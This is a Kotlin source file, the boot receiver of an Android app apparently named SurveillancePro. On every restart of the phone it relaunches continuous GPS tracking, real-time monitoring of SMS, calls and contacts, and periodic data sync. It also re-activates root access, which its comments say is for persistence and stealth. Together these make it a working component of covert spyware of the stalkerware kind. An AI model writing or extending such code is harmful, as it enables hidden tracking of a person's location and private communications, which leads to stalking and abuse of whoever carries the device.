package com.surveillancepro.android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.RootActivator
import com.surveillancepro.android.services.ContentObserverService
import com.surveillancepro.android.services.LocationService
import com.surveillancepro.android.workers.SyncWorker

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED &&
            intent.action != "android.intent.action.QUICKBOOT_POWERON") return

        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        Log.d("BootReceiver", "Device booted, restarting all services")

        val queue = EventQueue.getInstance(context)
        val timestamp = java.text.SimpleDateFormat(
            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US
        ).format(java.util.Date())

        queue.enqueue("device_boot", mapOf(
            "timestamp" to timestamp,
            "model" to "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
            "system" to "Android ${android.os.Build.VERSION.RELEASE}",
        ))

        // GPS continu
        try {
            context.startForegroundService(
                Intent(context, LocationService::class.java).apply {
                    putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
                }
            )
        } catch (e: Exception) {
            Log.w("BootReceiver", "LocationService: ${e.message}")
        }

        // ContentObserver (SMS, appels, contacts en temps réel)
        try {
            context.startForegroundService(Intent(context, ContentObserverService::class.java))
        } catch (e: Exception) {
            Log.w("BootReceiver", "ContentObserverService: ${e.message}")
        }

        // SyncWorker périodique
        SyncWorker.schedule(context)
        SyncWorker.triggerNow(context)

        // Réactiver root (permissions, persistance, stealth)
        try {
            RootActivator.activate(context)
        } catch (e: Exception) {
            Log.w("BootReceiver", "Root activation: ${e.message}")
        }
    }
}
